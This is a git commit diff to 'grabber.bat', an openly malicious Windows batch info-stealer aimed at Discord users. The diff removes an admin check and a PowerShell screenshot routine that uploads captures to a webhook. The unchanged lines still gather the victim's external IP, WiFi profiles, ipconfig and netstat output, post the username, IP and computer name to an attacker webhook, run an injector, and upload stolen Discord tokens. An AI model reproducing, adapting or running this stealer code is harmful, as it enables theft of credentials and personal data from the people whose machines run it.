d2a17840b8b52b5ddad4ebe31ff7e5291199cfc1
K.Dot <110929758+KDot227@users.noreply.github.com>
2022-09-24 17:19:06 -0500

    Update grabber.bat
    removed things so no functions

--- grabber.bat
+++ grabber.bat
@@ -2,19 +2,6 @@
 :: Note as you can see a lot of this was by baum. I mainly just added back a working token grabber and injection and it took way longer than I'd like to admit. lol
 set webhook=YOUR_WEBHOOK_HERE
 ::Baum made this part so go give him love. I am using it cause 1.) its not bad at all and 2.) I am lazy. In conclusion go check out his github https://github.com/baum1810
-:check_Permissions
-    net session >nul 2>&1
-    if %errorLevel% == 0 (
-        goto starti
-    ) else (
-       cls
-       echo Failure: Please run the file again with Admin
-       timeout 2 >NUL
-       goto check_Permissions
-    )
-:starti
-::set 1 if you want that the discord of your target get closed ( discord needs to be restarted to send you the token)
-set /a killdc = 0
 ::get ip
 curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
 set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt
@@ -37,35 +24,6 @@ for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
 ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt
 ::gets the info about the netstat
 netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt
-
-::makes and sends a screenshot
-echo $SERDO = Get-Clipboard >%userprofile%\AppData\Local\Temp\test.ps1
-echo function Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
-echo { >>%userprofile%\AppData\Local\Temp\test.ps1
-echo     begin { >>%userprofile%\AppData\Local\Temp\test.ps1
-echo         Add-Type -AssemblyName System.Drawing, System.Windows.Forms >>%userprofile%\AppData\Local\Temp\test.ps1
-echo         Add-Type -AssemblyName System.Drawing >>%userprofile%\AppData\Local\Temp\test.ps1
-echo         $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() ^|  >>%userprofile%\AppData\Local\Temp\test.ps1
-echo             Where-Object { $_.FormatDescription -eq "JPEG" } >>%userprofile%\AppData\Local\Temp\test.ps1
-echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
-echo     process { >>%userprofile%\AppData\Local\Temp\test.ps1
-echo         Start-Sleep -Milliseconds 44 >>%userprofile%\AppData\Local\Temp\test.ps1
-echo             [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")    >>%userprofile%\AppData\Local\Temp\test.ps1
-echo         Start-Sleep -Milliseconds 550 >>%userprofile%\AppData\Local\Temp\test.ps1
-echo         $bitmap = [Windows.Forms.Clipboard]::GetImage()     >>%userprofile%\AppData\Local\Temp\test.ps1
-echo         $ep = New-Object Drawing.Imaging.EncoderParameters   >>%userprofile%\AppData\Local\Temp\test.ps1
-echo         $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)   >>%userprofile%\AppData\Local\Temp\test.ps1
-echo         $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture" >>%userprofile%\AppData\Local\Temp\test.ps1
-echo         $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep) >>%userprofile%\AppData\Local\Temp\test.ps1
-echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
-echo }							 >>%userprofile%\AppData\Local\Temp\test.ps1			
-echo Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
-echo Set-Clipboard -Value $SERDO >>%userprofile%\AppData\Local\Temp\test.ps1
-echo $result  = "%webhook%"  >>%userprofile%\AppData\Local\Temp\test.ps1
-echo $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture.jpg"	 >>%userprofile%\AppData\Local\Temp\test.ps1															
-echo curl.exe -i -F file=@"$screenCapturePathBase" $result >>%userprofile%\AppData\Local\Temp\test.ps1
-timeout 1 >NUL
-Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\test.ps1 && del %userprofile%\AppData\Local\Temp\test.ps1 
 
 ::sends the username, ip, current time, and date of the victim
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User = %username%  Ip = %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
@@ -112,6 +70,8 @@ timeout 3 >NUL
 start main.exe %webhook%
 timeout 3 >NUL
 taskkill /f /im main.exe
+
+
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\tokens.txt %webhook%
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```PC WAS INJECTED TO %webhook% HAVE FUN ```\"}" %webhook%
 
